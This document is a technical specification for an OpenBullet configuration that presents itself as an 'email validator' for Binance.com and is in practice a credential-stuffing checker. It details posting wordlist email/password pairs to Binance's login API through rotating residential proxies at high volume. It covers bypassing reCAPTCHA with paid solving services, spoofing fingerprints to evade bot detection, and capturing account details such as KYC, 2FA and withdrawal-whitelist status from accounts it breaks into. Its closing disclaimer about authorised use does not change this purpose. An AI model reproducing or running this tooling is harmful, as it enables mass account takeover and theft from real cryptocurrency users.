# Binance.com Advanced Email Validator - Technical Specifications

## Architecture Overview

This document provides detailed technical specifications for the Binance.com Advanced Email Validator configuration (v1.0.0) with comprehensive captcha support and multi-proxy compatibility.

## System Requirements

### OpenBullet Compatibility
- **Minimum Version:** OpenBullet 1.2.0
- **Recommended Version:** OpenBullet 2.x or Anomaly
- **Script Type:** LoliCode/LoliScript
- **Required Features:** 
  - JSON parsing support
  - Custom input support
  - Proxy management (HTTP/HTTPS/SOCKS4/SOCKS5)
  - Cookie handling
  - Variable manipulation
  - Label/jump support

### Resource Requirements
- **RAM:** Minimum 2GB, Recommended 4GB+ (for 300 bots)
- **CPU:** Multi-core processor (2+ cores recommended)
- **Network:** Stable connection with low latency
- **Proxy Pool:** Minimum 50 high-quality proxies (residential preferred)

## Configuration Parameters

### General Settings

| Parameter | Type | Value | Description |
|-----------|------|-------|-------------|
| SaveEmptyCaptures | Boolean | false | Don't save captures with no data |
| ContinueOnCustom | Boolean | true | Continue checking after CUSTOM status |
| SaveHitsToTextFile | Boolean | true | Save successful checks to file |
| IgnoreResponseErrors | Boolean | false | Fail on response errors |
| MaxRedirects | Integer | 10 | Maximum HTTP redirects |
| NeedsProxies | Boolean | true | Proxy requirement |
| OnlySocks | Boolean | false | Allow all proxy types |
| OnlySsl | Boolean | true | Use HTTPS connections only |
| MaxProxyUses | Integer | 15 | Maximum uses per proxy before rotation |
| BanProxyAfterGoodStatus | Boolean | false | Don't ban on success |
| BanLoopEvasionOverride | Integer | 20 | Override ban loop threshold |
| MaxCPM | Integer | 300 | Maximum checks per minute |
| SuggestedBots | Integer | 300 | Recommended concurrent workers |
| RandomUA | Boolean | true | Random User Agent rotation |

### Custom Input Configuration

The configuration includes **6 interactive prompts** that ask the user for settings when loading:

#### 1. PROXY_TYPE
- **Description:** Select Proxy Type (HTTP/HTTPS/SOCKS4/SOCKS5)
- **Default:** HTTP
- **Type:** String
- **Purpose:** Allows user to specify which proxy type to use
- **Validation:** User can enter any proxy type supported by OpenBullet

#### 2. CAPTCHA_SERVICE
- **Description:** Select Captcha Service (2CAPTCHA/ANTICAPTCHA/CAPMONSTER/NONE)
- **Default:** NONE
- **Type:** String
- **Purpose:** Selects which captcha solving service to use
- **Options:**
  - **2CAPTCHA:** Uses 2captcha.com service
  - **ANTICAPTCHA:** Uses anti-captcha.com service
  - **CAPMONSTER:** Uses capmonster.cloud service
  - **NONE:** Attempts without captcha solving

#### 3. CAPTCHA_API_KEY
- **Description:** Enter your Captcha Service API Key (leave empty if NONE)
- **Default:** Empty
- **Type:** String
- **Purpose:** API key for the selected captcha service
- **Security:** Stored as variable during session only

#### 4. USE_ADVANCED_EVASION
- **Description:** Use Advanced Anti-Bot Evasion? (YES/NO)
- **Default:** YES
- **Type:** String
- **Purpose:** Enables/disables advanced fingerprinting and evasion techniques
- **Features when enabled:**
  - Canvas fingerprinting
  - WebGL fingerprinting
  - Audio fingerprinting
  - Random screen resolution
  - Timezone simulation

#### 5. RETRY_ON_CAPTCHA
- **Description:** Retry on Captcha Required? (YES/NO)
- **Default:** YES
- **Type:** String
- **Purpose:** Automatically retry with captcha solving when captcha is required

#### 6. MAX_CAPTCHA_RETRIES
- **Description:** Maximum Captcha Retry Attempts
- **Default:** 3
- **Type:** Integer
- **Purpose:** Limits number of captcha retry attempts to prevent infinite loops

## Proxy Support

### Supported Proxy Types

| Proxy Type | Supported | Configuration | Notes |
|------------|-----------|---------------|-------|
| HTTP | ✅ Yes | Set PROXY_TYPE=HTTP | Standard HTTP proxy |
| HTTPS | ✅ Yes | Set PROXY_TYPE=HTTPS | Secure HTTP proxy (recommended) |
| SOCKS4 | ✅ Yes | Set PROXY_TYPE=SOCKS4 | SOCKS4 protocol |
| SOCKS5 | ✅ Yes | Set PROXY_TYPE=SOCKS5 | SOCKS5 protocol (most versatile) |

### Proxy Configuration
- **OnlySocks:** Disabled by default (allows all types)
- **User Control:** Proxy type is selected via CustomInput prompt
- **Rotation:** Automatic proxy rotation after 15 uses
- **Ban Handling:** Proxies banned after consecutive failures

### Proxy Recommendations
1. **Best:** Residential SOCKS5 proxies (highest success rate)
2. **Good:** Residential HTTP/HTTPS proxies
3. **Acceptable:** Datacenter SOCKS5 proxies
4. **Not Recommended:** Free proxies, datacenter HTTP proxies

## Captcha Service Integration

### Supported Services

#### 1. 2Captcha (2captcha.com)
- **API Endpoint:** http://2captcha.com/in.php
- **Result Endpoint:** http://2captcha.com/res.php
- **Method:** reCAPTCHA v2
- **Site Key:** 6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S
- **Solve Time:** 20-25 seconds average
- **Cost:** ~$2.99 per 1000 captchas

**Request Flow:**
```
1. POST captcha task with API key, site key, and page URL
2. Receive captcha ID
3. Wait 20-25 seconds
4. GET captcha result with ID
5. Parse reCAPTCHA response token
```

#### 2. Anti-Captcha (anti-captcha.com)
- **API Endpoint:** https://api.anti-captcha.com/createTask
- **Result Endpoint:** https://api.anti-captcha.com/getTaskResult
- **Method:** NoCaptchaTaskProxyless
- **Site Key:** 6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S
- **Solve Time:** 20-25 seconds average
- **Cost:** ~$2.00 per 1000 captchas

**Request Flow:**
```json
1. POST {
     "clientKey": "API_KEY",
     "task": {
       "type": "NoCaptchaTaskProxyless",
       "websiteURL": "https://www.binance.com/en/login",
       "websiteKey": "6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S"
     }
   }
2. Receive taskId
3. Wait 20-25 seconds
4. POST getTaskResult with taskId
5. Parse gRecaptchaResponse
```

#### 3. CapMonster (capmonster.cloud)
- **API Endpoint:** https://api.capmonster.cloud/createTask
- **Result Endpoint:** https://api.capmonster.cloud/getTaskResult
- **Method:** NoCaptchaTaskProxyless
- **Site Key:** 6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S
- **Solve Time:** 20-25 seconds average
- **Cost:** ~$1.00 per 1000 captchas (cheapest)

**Request Flow:** Same as Anti-Captcha (compatible API)

### Captcha Retry Logic

```
1. Check CAPTCHA_SERVICE setting
2. If not "NONE", attempt captcha solving
3. If captcha solving fails:
   - Increment captcha_retry_count
   - If count < MAX_CAPTCHA_RETRIES:
     - Wait 5-8 seconds
     - Jump to SOLVE_CAPTCHA
   - Else:
     - Log "Max retries reached"
     - Return FAIL
4. If "Captcha required" detected in response:
   - If RETRY_ON_CAPTCHA = "YES":
     - Increment retry count
     - Jump to SOLVE_CAPTCHA
   - Else:
     - Return FAIL
```

## Script Workflow

### Phase 1: Initialization
```
1. Set session variables:
   - captcha_retry_count = 0
   - session_id = random 10 chars
   - device_id = random 32 chars
   - timestamp = current timestamp
   - client_type = "web"

2. Log configuration:
   - Proxy type
   - Captcha service
   - Evasion settings
   - Session ID

3. If USE_ADVANCED_EVASION = "YES":
   - Generate fingerprint_canvas (random 64 chars)
   - Generate fingerprint_webgl (random 64 chars)
   - Generate fingerprint_audio (random 64 chars)
   - Set screen_resolution = "1920x1080"
   - Set timezone = "America/New_York"

4. Delay 800-2000ms (human simulation)
```

### Phase 2: CSRF Token Retrieval
```
LABEL: START_CHECK

1. GET https://www.binance.com/en/login
   Headers:
   - Accept: text/html,application/xhtml+xml,...
   - Accept-Language: en-US,en;q=0.9
   - User-Agent: Chrome 120 Windows
   - sec-ch-ua headers
   - Sec-Fetch headers

2. Parse CSRF token from response:
   PARSE "<SOURCE>" LR "\"csrfToken\":\"" "\""

3. If CSRF token parse fails:
   - Jump to RETRY_CSRF
   - Wait 2-3 seconds
   - Return to START_CHECK

4. Parse optional session data:
   - next_data (safe)
   - cookie_jar (safe)

5. Log CSRF token obtained

6. Delay 1200-2500ms (form fill simulation)
```

### Phase 3: Captcha Handling (if configured)
```
LABEL: CHECK_CAPTCHA

1. If CAPTCHA_SERVICE = "NONE":
   - Jump to TO_LOGIN (skip captcha)

2. Set captcha endpoint based on service:
   - 2CAPTCHA: http://2captcha.com/in.php
   - ANTICAPTCHA: https://api.anti-captcha.com/createTask
   - CAPMONSTER: https://api.capmonster.cloud/createTask

LABEL: SOLVE_CAPTCHA

3. If CAPTCHA_SERVICE != "NONE":
   - If captcha_retry_count < MAX_CAPTCHA_RETRIES:
     
     For 2CAPTCHA:
     a. GET http://2captcha.com/in.php?key=<KEY>&method=userrecaptcha&googlekey=6LdVYLcZAAAAAIFQCb8C9PqIiRWcB3CQcVGqGi7S&pageurl=https://www.binance.com/en/login&json=1
     b. Parse captcha_id
     c. Wait 20-25 seconds
     d. GET http://2captcha.com/res.php?key=<KEY>&action=get&id=<ID>&json=1
     e. Parse captcha_response
     
     For ANTICAPTCHA/CAPMONSTER:
     a. POST createTask with NoCaptchaTaskProxyless
     b. Parse taskId
     c. Wait 20-25 seconds
     d. POST getTaskResult with taskId
     e. Parse gRecaptchaResponse
     
     Set captcha_solved = "true"
```

### Phase 4: Authentication
```
LABEL: TO_LOGIN

1. Build login payload:
   If captcha_solved = "true":
     {
       "email": "<USER>",
       "password": "<PASS>",
       "recaptchaToken": "<captcha_response>",
       "csrfToken": "<csrf_token>",
       "clientType": "<client_type>"
     }
   Else:
     {
       "email": "<USER>",
       "password": "<PASS>",
       "csrfToken": "<csrf_token>",
       "clientType": "<client_type>"
     }

2. POST https://www.binance.com/bapi/accounts/v1/public/authcenter/login
   Headers:
   - Content-Type: application/json
   - Origin: https://www.binance.com
   - Referer: https://www.binance.com/en/login
   - bnc-uuid: <device_id>
   - clienttype: web
   - csrftoken: <csrf_token>
   - device-info: base64 encoded device fingerprint
   - x-trace-id: <session_id>
   - x-ui-request-trace: <session_id>
```

### Phase 5: Response Analysis
```
KEYCHECK:
  Success indicators:
    - "code":"000000"
    - "success":true
    - "token":
    - "userId":
  
  Failure indicators:
    - "code":"100001"
    - Invalid email or password
    - Account does not exist
    - "success":false
  
  Custom indicators:
    - Email not verified
    - 2FA required
    - KYC required
    - Account locked
    - Account suspended
    - Captcha required
    - Risk control
  
  Retry indicators:
    - Too many requests
    - Rate limit
    - Service temporarily unavailable
    - "code":"429"
    - "code":"503"

Parse data:
  - auth_token (safe)
  - user_id (safe)
  - response_code (safe)
  - response_msg (safe)

Handle "Captcha required":
  If RETRY_ON_CAPTCHA = "YES":
    - Increment captcha_retry_count
    - If count < MAX_CAPTCHA_RETRIES:
      - Wait 3-5 seconds
      - Jump to SOLVE_CAPTCHA
    - Else:
      - Return FAIL
  Else:
    - Return FAIL

If auth_token present:
  - Jump to GET_ACCOUNT_INFO

If response_code = "000000":
  - Jump to GET_ACCOUNT_INFO
Else:
  - Return FAIL
```

### Phase 6: Account Information Retrieval
```
LABEL: GET_ACCOUNT_INFO

1. Delay 500-1500ms (page transition)

2. GET https://www.binance.com/bapi/accounts/v1/private/account/user-base-info
   Headers:
   - Content-Type: application/json
   - Origin: https://www.binance.com
   - Referer: https://www.binance.com/en/my/dashboard
   - csrftoken: <csrf_token>
   - x-trace-id: <session_id>

3. Parse and capture user data:
   - emailVerified (boolean) -> CAP "Email Verified"
   - email (string) -> CAP "Email"
   - accountStatus (string) -> CAP "Account Status"
   - kycStatus (string) -> CAP "KYC Status"
   - twoFactorEnabled (boolean) -> CAP "2FA Enabled"
   - vipLevel (integer) -> CAP "VIP Level"
   - registerTime (timestamp) -> CAP "Registration Date"
   - country (string) -> CAP "Country"
   - userId (string) -> CAP "User ID"

4. GET https://www.binance.com/bapi/accounts/v1/private/account/security-status
   Headers: (same as above)

5. Parse and capture security data:
   - phoneVerified (boolean) -> CAP "Phone Verified"
   - antiPhishingEnabled (boolean) -> CAP "Anti-Phishing Enabled"
   - withdrawWhitelistEnabled (boolean) -> CAP "Withdrawal Whitelist"

6. Log account information

7. Return SUCCESS with CUSTOM status "VALID_ACCOUNT"
```

### Error Handlers
```
LABEL: RETRY_CSRF
  - Log "Failed to obtain CSRF token, retrying..."
  - Wait 2-3 seconds
  - Jump to START_CHECK

LABEL: CAPTCHA_ERROR
  - Increment captcha_retry_count
  - If count < MAX_CAPTCHA_RETRIES:
    - Log retry attempt
    - Wait 5-8 seconds
    - Jump to SOLVE_CAPTCHA
  - Else:
    - Log "Max retries reached"
    - Return FAIL
```

## API Endpoints

### Primary Endpoints
1. **https://www.binance.com/en/login** - Login page (CSRF token)
2. **https://www.binance.com/bapi/accounts/v1/public/authcenter/login** - Authentication
3. **https://www.binance.com/bapi/accounts/v1/private/account/user-base-info** - User profile
4. **https://www.binance.com/bapi/accounts/v1/private/account/security-status** - Security info

### Captcha Service Endpoints
1. **2Captcha:**
   - Submit: http://2captcha.com/in.php
   - Result: http://2captcha.com/res.php

2. **Anti-Captcha:**
   - Submit: https://api.anti-captcha.com/createTask
   - Result: https://api.anti-captcha.com/getTaskResult

3. **CapMonster:**
   - Submit: https://api.capmonster.cloud/createTask
   - Result: https://api.capmonster.cloud/getTaskResult

## Data Capture Schema

### Captured Variables

| Variable Name | Type | Label | Source |
|---------------|------|-------|--------|
| Email Verified | Boolean | Email Verified | User base info |
| Email | String | Email | User base info |
| Account Status | String | Account Status | User base info |
| KYC Status | String | KYC Status | User base info |
| 2FA Enabled | Boolean | 2FA Enabled | User base info |
| VIP Level | Integer | VIP Level | User base info |
| Registration Date | Timestamp | Registration Date | User base info |
| Country | String | Country | User base info |
| User ID | String | User ID | User base info |
| Phone Verified | Boolean | Phone Verified | Security status |
| Anti-Phishing Enabled | Boolean | Anti-Phishing Enabled | Security status |
| Withdrawal Whitelist | Boolean | Withdrawal Whitelist | Security status |

## Performance Metrics

### Expected Performance
- **Checks Per Minute (CPM):** 200-300 (depends on captcha usage)
- **With Captcha:** 100-150 CPM (captcha solving adds 20-30s per check)
- **Without Captcha:** 250-300 CPM (optimal)
- **Response Time:** 3-8 seconds per check (without captcha), 25-35 seconds (with captcha)
- **Memory Usage:** ~30-50MB per 100 bots
- **CPU Usage:** Low to moderate

### Optimization Tips
1. **Captcha Services:**
   - Use CapMonster for lowest cost
   - Use Anti-Captcha for best speed
   - Use 2Captcha for highest success rate
   
2. **Proxy Configuration:**
   - Use SOCKS5 residential proxies for best results
   - Rotate proxies frequently (MaxProxyUses: 15)
   - Monitor ban rates and adjust bot count
   
3. **Bot Count:**
   - Without captcha: Start with 150-200 bots
   - With captcha: Start with 50-100 bots
   - Scale based on proxy quality and captcha solve rate
   
4. **Advanced Evasion:**
   - Enable for better success rates
   - Minimal performance impact
   - Recommended for all scenarios

## Error Codes & Handling

### Binance API Response Codes

| Code | Status | Action | Description |
|------|--------|--------|-------------|
| 000000 | Success | SUCCESS | Valid credentials |
| 100001 | Failure | FAIL | Invalid email or password |
| 429 | Rate Limited | RETRY | Too many requests |
| 503 | Service Error | RETRY | Service temporarily unavailable |

### Custom Status Reasons

| Reason | Status | Description |
|--------|--------|-------------|
| VALID_ACCOUNT | SUCCESS | Valid login, data captured |
| Email not verified | CUSTOM | Valid credentials but email unverified |
| 2FA required | CUSTOM | Valid credentials but 2FA needed |
| KYC required | CUSTOM | Valid credentials but KYC needed |
| Account locked | CUSTOM | Account locked by Binance |
| Account suspended | CUSTOM | Account suspended |
| Captcha required | RETRY/FAIL | Captcha needed (retry if enabled) |
| Risk control | CUSTOM | Account under risk control |

## Advanced Features

### Anti-Bot Evasion Techniques
When `USE_ADVANCED_EVASION` is enabled:

1. **Fingerprint Randomization:**
   - Canvas fingerprint: 64-character random string
   - WebGL fingerprint: 64-character random string
   - Audio fingerprint: 64-character random string

2. **Device Emulation:**
   - Screen resolution: 1920x1080
   - Timezone: America/New_York
   - Device ID: 32-character random string
   - Session ID: 10-character random string

3. **Request Headers:**
   - User-Agent: Chrome 120 on Windows 10
   - sec-ch-ua headers for Chrome 120
   - Sec-Fetch headers for proper navigation
   - device-info header with base64 encoded fingerprint

4. **Human Behavior Simulation:**
   - Random delays: 800-2000ms between requests
   - Form fill simulation: 1200-2500ms before login
   - Page transition delay: 500-1500ms after login

### Session Management
- **Session ID:** Unique per check, used in x-trace-id headers
- **Device ID:** Unique per check, used in bnc-uuid header
- **CSRF Token:** Retrieved from login page, included in all requests
- **Cookies:** Automatically managed by OpenBullet

## Security Considerations

### Best Practices
1. **API Key Security:**
   - Never share captcha service API keys
   - Use environment variables if possible
   - Monitor API key usage and costs

2. **Proxy Quality:**
   - Use reputable proxy providers
   - Prefer residential over datacenter
   - Monitor proxy ban rates
   - Rotate proxies frequently

3. **Rate Limiting:**
   - Respect Binance rate limits
   - Use appropriate bot counts
   - Monitor for 429 errors
   - Implement exponential backoff

4. **Legal Compliance:**
   - Only check accounts you own or have authorization for
   - Comply with Binance Terms of Service
   - Follow local laws and regulations
   - Use for legitimate security testing only

## Troubleshooting

### High Failure Rate
**Possible Causes:**
- Poor proxy quality
- Binance detecting automated access
- Invalid credentials in wordlist
- Rate limiting

**Solutions:**
- Switch to residential proxies
- Enable advanced evasion
- Reduce bot count
- Add delays between checks

### Captcha Errors
**Possible Causes:**
- Invalid API key
- Insufficient captcha service balance
- Captcha service timeout
- Wrong captcha service selected

**Solutions:**
- Verify API key is correct
- Check captcha service balance
- Increase MAX_CAPTCHA_RETRIES
- Try different captcha service

### CSRF Token Failures
**Possible Causes:**
- Network connectivity issues
- Binance blocking proxy IP
- Page structure changed

**Solutions:**
- Check proxy connectivity
- Switch proxies
- Verify Binance page is accessible
- Update configuration if page changed

### Low CPM
**Possible Causes:**
- Captcha solving (adds 20-30s per check)
- Slow proxies
- Low bot count
- Network latency

**Solutions:**
- Disable captcha if not required
- Use faster proxies
- Increase bot count gradually
- Check network connection

## Configuration Files

### Main Configuration: BINANCE.COM.loli
- **Format:** LoliCode/LoliScript
- **Size:** ~18KB
- **Lines:** ~600+
- **Structure:**
  - [SETTINGS] section with JSON configuration
  - [SCRIPT] section with LoliCode logic

### Documentation Files
- **README.md:** Overview and usage guide
- **BINANCE_TECHNICAL_SPECS.md:** This technical documentation

## Changelog

### Version 1.0.0 (2025-11-20)
- Initial release
- Multi-proxy support (HTTP/HTTPS/SOCKS4/SOCKS5)
- Three captcha service integrations (2Captcha/Anti-Captcha/CapMonster)
- Six interactive configuration prompts
- Advanced anti-bot evasion features
- Comprehensive data extraction (12 data points)
- Smart error handling and retry logic
- Session management
- CSRF token handling
- Device fingerprinting
- Human behavior simulation

## Support & Updates

For issues, suggestions, or contributions:
- **Author:** legendhkek
- **Repository:** Config-
- **Version:** 1.0.0
- **Last Updated:** 2025-11-20

---

**Document Version:** 1.0  
**Last Updated:** 2025-11-20  
**Maintained by:** legendhkek
